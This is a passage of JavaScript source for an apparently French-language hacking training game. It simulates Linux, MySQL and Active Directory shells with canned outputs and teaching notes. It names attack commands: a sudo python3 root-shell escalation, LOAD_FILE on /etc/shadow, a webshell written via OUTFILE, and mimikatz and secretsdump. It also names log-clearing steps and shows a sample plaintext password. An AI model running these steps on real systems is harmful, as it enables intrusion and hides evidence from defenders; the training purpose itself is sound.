// ─── Machine mode — Linux (web + mail) ───────────────────────────────────────

function handleLinuxMachine(cmd, args, state, machine) {
  const scenario = MACHINE_SCENARIOS[machine.id];
  const phase = state.machinePhase;

  if (cmd === 'help') {
    return {
      output: [
        `\x1b[36m╔══════════════════════════════════════════╗\x1b[0m`,
        `\x1b[36m║  SHELL — ${machine.name.padEnd(32)}║\x1b[0m`,
        `\x1b[36m╚══════════════════════════════════════════╝\x1b[0m`,
        '',
        '\x1b[33mRECONNAISSANCE :\x1b[0m',
        '  recon / id / whoami / uname -a / hostname',
        '  cat /etc/os-release / ls -la / ps aux',
        '',
        '\x1b[33mSCANNING :\x1b[0m',
        '  nmap -sV <ip> / nikto -h <ip> / dirb http://<ip>',
        '  searchsploit <app> / gobuster dir -u http://<ip> -w wordlist',
        '',
        '\x1b[33mEXPLOITATION :\x1b[0m',
        '  exploit / sqlmap -u <url> / hydra / curl / nc',
        '',
        '\x1b[33mPOST-EXPLOITATION :\x1b[0m',
        '  sudo -l / find / -perm -4000 2>/dev/null',
        '  sudo python3 -c \'import os; os.system("/bin/bash")\'',
        '  cat /flag.txt / cat /root/flag.txt',
        '',
        '  exit → revenir au réseau',
      ].join('\n'),
      pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
    };
  }

  if (cmd === 'hint') {
    const phaseHints = [
      [`\x1b[33m💡 Phase RECON :\x1b[0m`, `  \x1b[36mrecon\x1b[0m ou \x1b[36mid\x1b[0m ou \x1b[36muname -a\x1b[0m`, machine.hints[0] ? `  Info: ${machine.hints[0]}` : ''],
      [`\x1b[33m💡 Phase SCAN :\x1b[0m`, `  \x1b[36mnmap -sV ${machine.ip}\x1b[0m ou \x1b[36mnikto -h ${machine.ip}\x1b[0m`, machine.hints[1] ? `  Info: ${machine.hints[1]}` : ''],
      [`\x1b[33m💡 Phase EXPLOIT :\x1b[0m`, `  \x1b[36mexploit\x1b[0m ou \x1b[36msqlmap\x1b[0m ou \x1b[36mhydra\x1b[0m`, machine.hints[2] ? `  Info: ${machine.hints[2]}` : ''],
      [`\x1b[33m💡 Phase POST-EXPLOIT :\x1b[0m`, `  \x1b[36msudo -l\x1b[0m → \x1b[36msudo python3 -c 'import os; os.system("/bin/bash")'\x1b[0m → \x1b[36mcat /flag.txt\x1b[0m`],
    ];
    const idx = Math.min(phase, phaseHints.length - 1);
    return { output: phaseHints[idx].filter(Boolean).join('\n'), pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
  }

  if (cmd === 'exit' || cmd === 'logout') {
    return {
      output: `\x1b[33m[DÉCONNEXION] Fermeture du shell sur ${machine.ip}\x1b[0m`,
      pedagogie: 'En post-exploitation : supprimer les traces (logs bash, fichiers déposés, connexions dans /var/log/auth.log). C\'est ce qu\'on appelle "cleaning up".',
      effect: { type: 'EXIT_MACHINE' },
      xpBonus: 0,
      stateChanges: { mode: 'NETWORK', currentMachine: null, rootObtained: false }
    };
  }

  // ─── Phase 0→1 : Reconnaissance ──────────────────────────────────────────
  const reconCmds = ['recon', 'whois', 'dig', 'id', 'uname', 'hostname', 'ifconfig', 'ip'];
  if (reconCmds.includes(cmd) || (cmd === 'cat' && args[0] === '/etc/os-release')) {
    if (phase >= 1) return { output: `\x1b[33m[Déjà fait]\x1b[0m Recon complétée. Phase actuelle : ${getPhaseName(phase)}.`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    const pr = scenario.phase_recon;
    return {
      output: [
        `\x1b[36m╔═══════════════════════════════════════╗\x1b[0m`,
        `\x1b[36m║  PHASE 1 — RECONNAISSANCE             ║\x1b[0m`,
        `\x1b[36m╚═══════════════════════════════════════╝\x1b[0m`,
        `Cible : ${machine.ip} (${machine.name}) — ${machine.os}`,
        '',
        ...pr.reveals.map(r => `\x1b[33m[+]\x1b[0m ${r}`),
        '',
        `\x1b[32m✓ Reconnaissance terminée ! +${pr.xp} XP\x1b[0m`,
        `\x1b[37m→ Scanning : nmap -sV ${machine.ip} | nikto -h ${machine.ip} | searchsploit\x1b[0m`,
      ].join('\n'),
      pedagogie: 'La reconnaissance sur une machine déjà compromise inclut : identité (id/whoami), kernel (uname -a), réseau (ip a, netstat), processus (ps aux), crons (crontab -l), services (systemctl).',
      effect: { type: 'PHASE_COMPLETE', phase: 'RECON', machineId: machine.id },
      xpBonus: pr.xp,
      stateChanges: { machinePhase: 1 }
    };
  }

  // ─── Phase 1→2 : Scanning ────────────────────────────────────────────────
  const scanCmds = ['nmap', 'nikto', 'dirb', 'gobuster', 'searchsploit', 'feroxbuster', 'wfuzz', 'ffuf', 'smtp-user-enum'];
  if (scanCmds.includes(cmd)) {
    if (phase < 1) return { output: `\x1b[31m[!] Lance d\'abord la reconnaissance : recon\x1b[0m`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    if (phase >= 2) return { output: `\x1b[33m[Déjà fait]\x1b[0m Scanning complété. Passe à l\'exploitation.`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    const ps = scenario.phase_scan;
    const pedas = {
      nmap: 'nmap -sV -sC : scripts NSE en plus de la détection de versions. -p- scanne tous les 65535 ports. -A active la détection d\'OS, le traceroute et les scripts.',
      nikto: 'Nikto : scanner web qui teste > 6700 fichiers/CGIs dangereux, versions obsolètes, configs non sécurisées. Bruyant — déclenche les IDS.',
      dirb: 'dirb brute-force les répertoires web avec une wordlist. Équivalents modernes : gobuster, feroxbuster (multi-thread), ffuf. Découverte de /admin, /backup, /api.',
      searchsploit: 'searchsploit cherche dans Exploit-DB local. Toujours vérifier la version exacte. Copier le script : searchsploit -m <id>.',
      gobuster: 'gobuster est plus rapide que dirb. Mode dir pour répertoires, dns pour sous-domaines, vhost pour virtual hosts.',
    };
    return {
      output: [
        `\x1b[36m╔═══════════════════════════════════════╗\x1b[0m`,
        `\x1b[36m║  PHASE 2 — SCANNING & ENUMÉRATION     ║\x1b[0m`,
        `\x1b[36m╚═══════════════════════════════════════╝\x1b[0m`,
        `Target : ${machine.ip}`,
        '',
        ...ps.reveals.map(r => `\x1b[33m[+]\x1b[0m ${r}`),
        '',
        `\x1b[32m✓ Scanning terminé ! +${ps.xp} XP\x1b[0m`,
        `\x1b[37m→ Exploitation : exploit / sqlmap / hydra / nc / curl\x1b[0m`,
      ].join('\n'),
      pedagogie: pedas[cmd] || 'Scanning approfondi terminé.',
      effect: { type: 'PHASE_COMPLETE', phase: 'SCAN', machineId: machine.id },
      xpBonus: ps.xp,
      stateChanges: { machinePhase: 2 }
    };
  }

  // ─── Phase 2→3 : Exploitation ─────────────────────────────────────────────
  const exploitCmds = ['sqlmap', 'hydra', 'curl', 'nc', 'exploit', 'python3', 'msfconsole', 'metasploit', 'burpsuite'];
  if (exploitCmds.includes(cmd)) {
    if (phase < 2) return { output: `\x1b[31m[!] Tu n\'as pas encore scanné la machine.\x1b[0m`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    if (phase >= 3) return { output: `\x1b[33m[Déjà fait]\x1b[0m Exploitation complétée. Lance : id / sudo -l / cat /flag.txt`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    const pe = scenario.phase_exploit;
    const pedas = {
      sqlmap: 'sqlmap automatise la détection et l\'exploitation des injections SQL : --dbs (bases), --tables (tables), --dump (données), --os-shell (shell via SQLi). Toujours sur cibles autorisées.',
      hydra: 'Hydra brute-force multi-protocoles. Ici il casse SSH, SMTP, ou une auth web.',
      curl: 'curl permet d\'envoyer des requêtes HTTP manuellement : tester des payloads, lire des headers, uploader des fichiers via multipart.',
      nc: 'netcat : établit des connexions TCP/UDP brutes. Utilisé pour les reverse shells, l\'écoute de ports, le transfert de fichiers.',
      exploit: 'L\'exploit tire parti de la CVE identifiée lors du scanning pour obtenir un accès non autorisé.',
    };
    return {
      output: [
        `\x1b[36m╔═══════════════════════════════════════╗\x1b[0m`,
        `\x1b[36m║  PHASE 3 — EXPLOITATION               ║\x1b[0m`,
        `\x1b[36m╚═══════════════════════════════════════╝\x1b[0m`,
        '',
        ...pe.reveals.map(r => `\x1b[31m[+]\x1b[0m ${r}`),
        '',
        `\x1b[32m✓ Exploitation réussie ! +${pe.xp} XP\x1b[0m`,
        `\x1b[37m→ Post-exploitation : id → sudo -l → sudo python3 ... → cat /flag.txt\x1b[0m`,
      ].join('\n'),
      pedagogie: pedas[cmd] || 'Exploitation réussie.',
      effect: { type: 'PHASE_COMPLETE', phase: 'EXPLOIT', machineId: machine.id },
      xpBonus: pe.xp,
      stateChanges: { machinePhase: 3 }
    };
  }

  // ─── Phase 3 : Post-exploitation ─────────────────────────────────────────
  if (cmd === 'whoami' || cmd === 'id') {
    if (phase < 3) return { output: `\x1b[33mTu n\'es pas encore sur la machine. Exploite-la d\'abord.\x1b[0m`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    const user = state.rootObtained ? 'root' : 'www-data';
    const uid = state.rootObtained ? 'uid=0(root) gid=0(root) groups=0(root)' : 'uid=33(www-data) gid=33(www-data) groups=33(www-data)';
    return {
      output: `${uid}\n${state.rootObtained ? '' : '\x1b[33m💡 Tu es www-data, pas root. Escalade : sudo -l\x1b[0m'}`,
      pedagogie: 'id donne uid, gid, et groupes. uid=0 = root. Chercher aussi dans sudo, SUID, capabilities, cron, services mal configurés.',
      effect: null, xpBonus: 5, stateChanges: {}
    };
  }

  if (cmd === 'uname') {
    if (phase < 3) return { output: 'bash: uname: permission denied', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    return {
      output: `Linux ${machine.ip.replace(/\./g, '-')} 5.4.0-182-generic #202-Ubuntu SMP Fri Apr 26 12:29:36 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux`,
      pedagogie: 'uname -a révèle le kernel. Cherche des exploits kernel (DirtyPipe CVE-2022-0847, DirtyCOW CVE-2016-5195) si sudo/SUID ne suffisent pas.',
      effect: null, xpBonus: 5, stateChanges: {}
    };
  }

  if (cmd === 'sudo') {
    if (phase < 3) return { output: `sudo: tu n\'as pas encore d\'accès à cette machine.`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    if (args[0] === '-l') {
      return {
        output: [
          `Matching Defaults entries for www-data on ${machine.ip}:`,
          '    env_reset, mail_badpass',
          '',
          `User www-data may run the following commands on ${machine.ip}:`,
          `\x1b[32m    (root) NOPASSWD: /usr/bin/python3\x1b[0m`,
          '',
          '\x1b[33m💡 PrivEsc trouvée ! python3 NOPASSWD → shell root :\x1b[0m',
          `\x1b[36m   sudo python3 -c 'import os; os.system("/bin/bash")'\x1b[0m`,
          '   (Référence : GTFOBins — gtfobins.github.io)',
        ].join('\n'),
        pedagogie: 'sudo -l liste les commandes exécutables en root. NOPASSWD + python3/vim/find/bash = escalade immédiate. Voir GTFOBins pour la technique par binaire.',
        effect: null, xpBonus: 20, stateChanges: {}
      };
    }
    const cmdLine = args.join(' ');
    if (cmdLine.includes('python3') || cmdLine.includes('python') || cmdLine.includes('su')) {
      return {
        output: [
          '\x1b[32m[+] Élévation de privilèges réussie !\x1b[0m',
          `root@${machine.ip.replace(/\./g, '-')}:~# id`,
          'uid=0(root) gid=0(root) groups=0(root)',
          '',
          '\x1b[32m🎉 ROOT obtenu ! Capture le flag :\x1b[0m',
          '\x1b[36m   cat /root/flag.txt\x1b[0m',
        ].join('\n'),
        pedagogie: 'sudo python3 → import os + os.system("/bin/bash") spawne un shell bash avec les droits de l\'utilisateur sudo, soit root. Technique classique dans GTFOBins.',
        effect: { type: 'ROOT_OBTAINED', machineId: machine.id },
        xpBonus: 50,
        stateChanges: { rootObtained: true }
      };
    }
    return { output: 'sudo: commande inconnue. Essaie : sudo -l', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
  }

  if (cmd === 'find') {
    if (phase < 3) return { output: 'find: permission denied', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    return {
      output: [
        '/usr/bin/python3',
        '/usr/bin/pkexec',
        '/usr/bin/passwd',
        '/bin/mount',
        '/bin/su',
        '',
        '\x1b[33m💡 /usr/bin/python3 SUID → sudo -l pour vérifier\x1b[0m',
      ].join('\n'),
      pedagogie: 'find / -perm -4000 2>/dev/null liste tous les binaires SUID. Si le propriétaire est root, ils s\'exécutent avec ses droits. Voir GTFOBins pour l\'exploitation par binaire.',
      effect: null, xpBonus: 10, stateChanges: {}
    };
  }

  if (cmd === 'cat') {
    const target = args[0];
    if (!target) return { output: 'Usage: cat <fichier>', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };

    const isFlag = ['/flag.txt', 'flag.txt', '/root/flag.txt', '/root/flag', '/tmp/flag.txt'].includes(target);
    if (isFlag) {
      if (phase < 3) return { output: `cat: ${target}: No such file or directory`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
      if (!state.rootObtained) {
        return {
          output: `\x1b[31mcat: ${target}: Permission denied\x1b[0m\n\x1b[33m💡 Tu dois être root. Lance : sudo -l\x1b[0m`,
          pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
        };
      }
      return captureFlagAndFinish(machine, state, scenario);
    }

    if (phase < 3) return { output: `cat: ${target}: No such file or directory`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    if (target.includes('postfix') || target.includes('main.cf')) {
      return {
        output: [
          '# Postfix main.cf',
          'myhostname = mail.corp.local',
          'mydomain = corp.local',
          'smtpd_banner = $myhostname ESMTP $mail_name',
          '\x1b[32mldap_bind_dn = cn=service,dc=corp,dc=local\x1b[0m',
          '\x1b[32mldap_bind_pw = C0rpS3cr3t\x1b[0m',
          'mynetworks = 127.0.0.0/8, 192.168.1.0/24',
        ].join('\n'),
        pedagogie: 'Les fichiers de configuration contiennent souvent des credentials en clair. /etc/postfix/main.cf, /etc/mysql/my.cnf, /var/www/html/config.php sont des cibles classiques.',
        effect: null, xpBonus: 15, stateChanges: {}
      };
    }
    if (target.includes('passwd')) {
      return {
        output: 'root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000::/home/admin:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
        pedagogie: '/etc/passwd liste tous les utilisateurs. Les utilisateurs avec /bin/bash ont un shell interactif. Combine avec /etc/shadow pour craquer les hashes.',
        effect: null, xpBonus: 5, stateChanges: {}
      };
    }
    return { output: `cat: ${target}: No such file or directory`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
  }

  if (cmd === 'scores' || cmd === 'scoreboard') {
    return { output: '', pedagogie: null, effect: { type: 'SHOW_SCORES' }, xpBonus: 0, stateChanges: {} };
  }

  return {
    output: `\x1b[31mbash: ${cmd}: command not found\x1b[0m\nTape \x1b[33mhelp\x1b[0m pour les commandes disponibles.`,
    pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
  };
}

// ─── Machine mode — MySQL (DB Server) ────────────────────────────────────────

function handleDBMachine(cmd, args, state, machine) {
  const scenario = MACHINE_SCENARIOS.dbserver;
  const phase = state.machinePhase;
  const fullCmd = cmd + (args.length ? ' ' + args.join(' ') : '');

  if (cmd === 'help') {
    return {
      output: [
        '\x1b[36m╔══════════════════════════════════════════╗\x1b[0m',
        '\x1b[36m║  MySQL SHELL — DB Server                 ║\x1b[0m',
        '\x1b[36m╚══════════════════════════════════════════╝\x1b[0m',
        '',
        '\x1b[33mRECONNAISSANCE :\x1b[0m',
        '  show databases;        Lister les bases',
        '  select version();      Version MySQL',
        '  recon                  Résumé complet',
        '',
        '\x1b[33mENUMÉRATION :\x1b[0m',
        '  use <database>;        Sélectionner une base',
        '  show tables;           Lister les tables',
        '  describe <table>;      Structure d\'une table',
        '',
        '\x1b[33mEXPLOITATION :\x1b[0m',
        '  select * from <table>;                  Lire les données',
        '  SELECT LOAD_FILE(\'/etc/shadow\');         Lire fichiers système',
        '  SELECT ... INTO OUTFILE \'/tmp/shell.php\'; Écrire un webshell',
        '',
        '\x1b[33mPOST-EXPLOITATION :\x1b[0m',
        '  cat /flag.txt   (flag final après dump)',
        '',
        '  exit → revenir au réseau',
      ].join('\n'),
      pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
    };
  }

  if (cmd === 'hint') {
    const hints = [
      ['\x1b[33m💡 Phase RECON :\x1b[0m', '  \x1b[36mshow databases;\x1b[0m  ou  \x1b[36mrecon\x1b[0m'],
      ['\x1b[33m💡 Phase ENUM :\x1b[0m', '  \x1b[36muse corp_db;\x1b[0m  puis  \x1b[36mshow tables;\x1b[0m'],
      ['\x1b[33m💡 Phase EXPLOIT :\x1b[0m', '  \x1b[36mSELECT * FROM credentials;\x1b[0m', '  \x1b[36mSELECT LOAD_FILE(\'/etc/shadow\');\x1b[0m'],
      ['\x1b[33m💡 Phase POST :\x1b[0m', '  \x1b[36mcat /flag.txt\x1b[0m'],
    ];
    return { output: hints[Math.min(phase, hints.length-1)].join('\n'), pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
  }

  if (cmd === 'exit' || cmd === 'quit' || fullCmd.includes('quit;') || fullCmd.includes('exit;')) {
    return {
      output: '\x1b[33mBye — déconnexion MySQL\x1b[0m',
      pedagogie: 'Après exfiltration, nettoyer les logs MySQL : FLUSH LOGS; et supprimer les fichiers créés via OUTFILE.',
      effect: { type: 'EXIT_MACHINE' },
      xpBonus: 0,
      stateChanges: { mode: 'NETWORK', currentMachine: null, rootObtained: false }
    };
  }

  // Phase 0→1 : show databases / recon
  const isRecon = cmd === 'recon' || cmd === 'show' || (cmd === 'select' && args.join(' ').includes('version'));
  if (isRecon) {
    if (phase >= 1) return { output: '\x1b[33m[Déjà fait]\x1b[0m Base de données explorée. Phase : ' + getPhaseName(phase), pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    const pr = scenario.phase_recon;
    return {
      output: [
        '\x1b[36m╔═══════════════════════════════════════╗\x1b[0m',
        '\x1b[36m║  PHASE 1 — EXPLORATION MySQL          ║\x1b[0m',
        '\x1b[36m╚═══════════════════════════════════════╝\x1b[0m',
        '',
        ...pr.reveals.map(r => r.startsWith('mysql>') || r.startsWith('+') || r.startsWith('|') ? `\x1b[37m${r}\x1b[0m` : `\x1b[33m[+]\x1b[0m ${r}`),
        '',
        `\x1b[32m✓ +${pr.xp} XP\x1b[0m`,
        '\x1b[37m→ use corp_db;  puis  show tables;\x1b[0m',
      ].join('\n'),
      pedagogie: 'MySQL : SHOW DATABASES liste les bases accessibles par l\'utilisateur courant. information_schema contient les métadonnées (structure de toutes les bases). mysql contient les utilisateurs et permissions.',
      effect: null, xpBonus: pr.xp,
      stateChanges: { machinePhase: 1 }
    };
  }

  // Phase 1→2 : use/describe/show tables
  const isScan = (cmd === 'use') || (cmd === 'describe' || cmd === 'desc') ||
                 (cmd === 'show' && args.includes('tables;')) ||
                 (cmd === 'show' && args.join(' ').includes('table'));
  if (isScan) {
    if (phase < 1) return { output: '\x1b[31m[!] Lance d\'abord : show databases;\x1b[0m', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    if (phase >= 2) return { output: '\x1b[33m[Déjà fait]\x1b[0m Tables énumérées. Passe à l\'exploitation.', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    const ps = scenario.phase_scan;
    return {
      output: [
        '\x1b[36m╔═══════════════════════════════════════╗\x1b[0m',
        '\x1b[36m║  PHASE 2 — ÉNUMÉRATION DES TABLES     ║\x1b[0m',
        '\x1b[36m╚═══════════════════════════════════════╝\x1b[0m',
        '',
        ...ps.reveals.map(r => r.startsWith('mysql>') || r.startsWith('|') || r.startsWith('+') ? `\x1b[37m${r}\x1b[0m` : `\x1b[33m[+]\x1b[0m ${r}`),
        '',
        `\x1b[32m✓ +${ps.xp} XP\x1b[0m`,
        '\x1b[37m→ SELECT * FROM credentials;  /  SELECT LOAD_FILE(\'/etc/shadow\');\x1b[0m',
      ].join('\n'),
      pedagogie: 'USE <db> sélectionne une base. SHOW TABLES liste ses tables. DESCRIBE <table> montre la structure (colonnes, types, clés). Les tables nommées credentials, users, secrets sont des cibles prioritaires.',
      effect: null, xpBonus: ps.xp,
      stateChanges: { machinePhase: 2 }
    };
  }

  // Phase 2→3 : SELECT / LOAD_FILE / dump
  const isExploit = cmd === 'select' || cmd === 'SELECT' ||
                    cmd === 'mysqldump' ||
                    (fullCmd.toLowerCase().includes('load_file') || fullCmd.toLowerCase().includes('outfile'));
  if (isExploit) {
    if (phase < 2) return { output: '\x1b[31m[!] Énumère d\'abord les tables : use corp_db; show tables;\x1b[0m', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    if (phase >= 3) return { output: '\x1b[33m[Déjà fait]\x1b[0m Données exfiltrées. Lance : cat /flag.txt', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    const pe = scenario.phase_exploit;
    return {
      output: [
        '\x1b[36m╔═══════════════════════════════════════╗\x1b[0m',
        '\x1b[36m║  PHASE 3 — EXFILTRATION               ║\x1b[0m',
        '\x1b[36m╚═══════════════════════════════════════╝\x1b[0m',
        '',
        ...pe.reveals.map(r => `\x1b[31m[+]\x1b[0m ${r}`),
        '',
        `\x1b[32m✓ +${pe.xp} XP\x1b[0m`,
        '\x1b[37m→ cat /flag.txt  pour capturer le flag\x1b[0m',
      ].join('\n'),
      pedagogie: 'SELECT LOAD_FILE() est possible si l\'utilisateur MySQL a le privilege FILE et que le fichier est lisible par mysql (world-readable). Technique utilisée pour lire /etc/passwd, /etc/shadow, des clés SSH.',
      effect: null, xpBonus: pe.xp,
      stateChanges: { machinePhase: 3, rootObtained: true }
    };
  }

  // cat /flag.txt
  if (cmd === 'cat') {
    const target = args[0];
    if (['/flag.txt', 'flag.txt', '/root/flag.txt'].includes(target)) {
      if (phase < 3) return { output: `\x1b[31mcat: ${target}: Permission denied\x1b[0m\nExploite d\'abord la base de données.`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
      return captureFlagAndFinish(machine, state, scenario);
    }
    return { output: `cat: ${target || ''}: No such file or directory`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
  }

  if (cmd === 'scores' || cmd === 'scoreboard') {
    return { output: '', pedagogie: null, effect: { type: 'SHOW_SCORES' }, xpBonus: 0, stateChanges: {} };
  }

  return {
    output: `\x1b[31mERROR 1064 (42000): Syntax error or command not found: '${cmd}'\x1b[0m\nTape \x1b[33mhelp\x1b[0m pour les commandes disponibles.`,
    pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
  };
}

// ─── Machine mode — Windows/WinRM (Domain Controller) ────────────────────────

function handleDCMachine(cmd, args, state, machine) {
  const scenario = MACHINE_SCENARIOS.dc;
  const phase = state.machinePhase;
  const fullCmd = [cmd, ...args].join(' ');

  if (cmd === 'help') {
    return {
      output: [
        '\x1b[36m╔══════════════════════════════════════════╗\x1b[0m',
        '\x1b[36m║  WinRM SHELL — Domain Controller         ║\x1b[0m',
        '\x1b[36m╚══════════════════════════════════════════╝\x1b[0m',
        '',
        '\x1b[33mRECONNAISSANCE :\x1b[0m',
        '  whoami /all                 Identité + groupes + privileges',
        '  net user /domain            Tous les utilisateurs du domaine',
        '  hostname / systeminfo       Infos système',
        '  recon                       Résumé AD complet',
        '',
        '\x1b[33mENUMÉRATION AD :\x1b[0m',
        '  net localgroup "Domain Admins"    Admins du domaine',
        '  net group "Domain Controllers"    Contrôleurs de domaine',
        '  GetUserSPNs.py / bloodhound       Kerberoasting / chemin DA',
        '',
        '\x1b[33mEXPLOITATION :\x1b[0m',
        '  secretsdump / mimikatz / Invoke-Mimikatz',
        '  hashcat -m 1000 hash.txt rockyou.txt',
        '',
        '\x1b[33mPOST-EXPLOITATION :\x1b[0m',
        '  type C:\\flag.txt   ou   cat /flag.txt',
        '',
        '  exit → revenir au réseau',
      ].join('\n'),
      pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
    };
  }

  if (cmd === 'hint') {
    const hints = [
      ['\x1b[33m💡 Phase RECON :\x1b[0m', '  \x1b[36mwhoami /all\x1b[0m  ou  \x1b[36mnet user /domain\x1b[0m  ou  \x1b[36mrecon\x1b[0m'],
      ['\x1b[33m💡 Phase ENUM :\x1b[0m', '  \x1b[36mnet localgroup "Domain Admins"\x1b[0m  ou  \x1b[36mGetUserSPNs.py\x1b[0m'],
      ['\x1b[33m💡 Phase EXPLOIT :\x1b[0m', '  \x1b[36msecretsdump\x1b[0m  ou  \x1b[36mmimikatz\x1b[0m'],
      ['\x1b[33m💡 Phase POST :\x1b[0m', '  \x1b[36mtype C:\\flag.txt\x1b[0m'],
    ];
    return { output: hints[Math.min(phase, hints.length-1)].join('\n'), pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
  }

  if (cmd === 'exit') {
    return {
      output: '\x1b[33m[DÉCONNEXION] Fermeture de la session WinRM\x1b[0m',
      pedagogie: 'Nettoyage post-exploitation Windows : supprimer les logs (wevtutil cl Security), les fichiers déposés, et les comptes créés.',
      effect: { type: 'EXIT_MACHINE' },
      xpBonus: 0,
      stateChanges: { mode: 'NETWORK', currentMachine: null, rootObtained: false }
    };
  }

  // Phase 0→1 : whoami /all / net user / hostname / recon
  const reconCmds = ['recon', 'hostname', 'systeminfo'];
  const isWhoamiAll = cmd === 'whoami' && args.includes('/all');
  const isNetUser = cmd === 'net' && args.includes('user');
  if (reconCmds.includes(cmd) || isWhoamiAll || isNetUser || cmd === 'whoami') {
    if (phase >= 1) {
      const user = 'CORP\\Administrator';
      const uid = '\x1b[32mUID: Administrator — Domain Admins, Schema Admins, Enterprise Admins\x1b[0m';
      return { output: cmd === 'whoami' ? user : uid, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }
    const pr = scenario.phase_recon;
    return {
      output: [
        '\x1b[36m╔═══════════════════════════════════════╗\x1b[0m',
        '\x1b[36m║  PHASE 1 — RECONNAISSANCE AD          ║\x1b[0m',
        '\x1b[36m╚═══════════════════════════════════════╝\x1b[0m',
        '',
        ...pr.reveals.map(r => `\x1b[33m[+]\x1b[0m ${r}`),
        '',
        `\x1b[32m✓ +${pr.xp} XP\x1b[0m`,
        '\x1b[37m→ net localgroup "Domain Admins" / GetUserSPNs.py / bloodhound\x1b[0m',
      ].join('\n'),
      pedagogie: 'whoami /all affiche le token d\'accès complet : SID, groupes, et privileges Windows (SeDebugPrivilege, SeImpersonatePrivilege...). C\'est le premier réflexe en post-exploitation Windows.',
      effect: null, xpBonus: pr.xp,
      stateChanges: { machinePhase: 1 }
    };
  }

  // Phase 1→2 : net localgroup / GetUserSPNs / bloodhound / ldapsearch
  const scanCmds = ['GetUserSPNs.py', 'bloodhound', 'bloodhound-python', 'ldapsearch', 'enum4linux', 'crackmapexec', 'cme'];
  const isNetGroup = cmd === 'net' && (args.includes('localgroup') || args.includes('group'));
  if (scanCmds.includes(cmd) || isNetGroup) {
    if (phase < 1) return { output: '\x1b[31m[!] Lance d\'abord la reconnaissance : whoami /all\x1b[0m', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    if (phase >= 2) return { output: '\x1b[33m[Déjà fait]\x1b[0m Énumération AD terminée. Passe à l\'exploitation.', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    const ps = scenario.phase_scan;

    const isBloodhound = cmd === 'bloodhound' || cmd === 'bloodhound-python';
    const bloodhoundOutput = isBloodhound ? [
      '',
      `\x1b[36m[*] BloodHound.py v1.6.1 — SharpHound ingestor\x1b[0m`,
      `[*] Authenticating as CORP\\Administrator`,
      `[*] Collecting : Session, ACL, ObjectProps, LocalAdmin, Trusts`,
      '',
      `\x1b[32m[+] 6 Users collectés\x1b[0m`,
      `\x1b[32m[+] 3 Groups collectés (Domain Admins, Backup Operators, Remote Management)\x1b[0m`,
      `\x1b[32m[+] 1 Domain collecté (CORP.LOCAL)\x1b[0m`,
      `\x1b[32m[+] 2 GPO collectées\x1b[0m`,
      `\x1b[32m[+] ACL : 847 ACEs analysées\x1b[0m`,
      '',
      `\x1b[31m[!] CHEMIN CRITIQUE DÉCOUVERT :\x1b[0m`,
      `   svc_backup \x1b[33m──[GenericAll]──▶\x1b[0m Domain Admins`,
      `   svc_backup \x1b[33m──[DCSync]──────▶\x1b[0m CORP.LOCAL`,
      `   Shortest path to DA : \x1b[31m1 hop !\x1b[0m`,
      '',
      `\x1b[31m[!] svc_backup membre de "Backup Operators" :\x1b[0m`,
      `   Backup Operators \x1b[33m──[SeBackupPrivilege]──▶\x1b[0m Lecture NTDS.dit`,
      `   Backup Operators \x1b[33m──[WriteOwner sur DC]──▶\x1b[0m`,
      '',
      `[*] Fichiers JSON générés : 20240115_BloodHound.zip`,
      `[*] Importe dans l\'interface BloodHound pour visualiser les chemins`,
    ] : [];

    return {
      output: [
        '\x1b[36m╔═══════════════════════════════════════╗\x1b[0m',
        '\x1b[36m║  PHASE 2 — ÉNUMÉRATION ACTIVE DIR.    ║\x1b[0m',
        '\x1b[36m╚═══════════════════════════════════════╝\x1b[0m',
        '',
        ...ps.reveals.map(r => `\x1b[33m[+]\x1b[0m ${r}`),
        ...bloodhoundOutput,
        '',
        `\x1b[32m✓ +${ps.xp} XP\x1b[0m`,
        '\x1b[37m→ secretsdump / mimikatz / Invoke-Mimikatz\x1b[0m',
      ].join('\n'),
      pedagogie: 'BloodHound/SharpHound collecte les relations AD (groupes, ACLs, sessions actives) et les représente sous forme de graphe. Le moteur de requêtes Neo4j permet de trouver le chemin le plus court vers Domain Admin. Ici : svc_backup → DCSync en 1 seul hop = misconfiguration critique d\'ACL sur l\'objet domaine.',
      effect: null, xpBonus: ps.xp,
      stateChanges: { machinePhase: 2 }
    };
  }

  // Phase 2→3 : secretsdump / mimikatz / hashcat
  const exploitCmds = ['secretsdump', 'secretsdump.py', 'mimikatz', 'invoke-mimikatz', 'lsadump', 'hashcat', 'ntdsutil'];
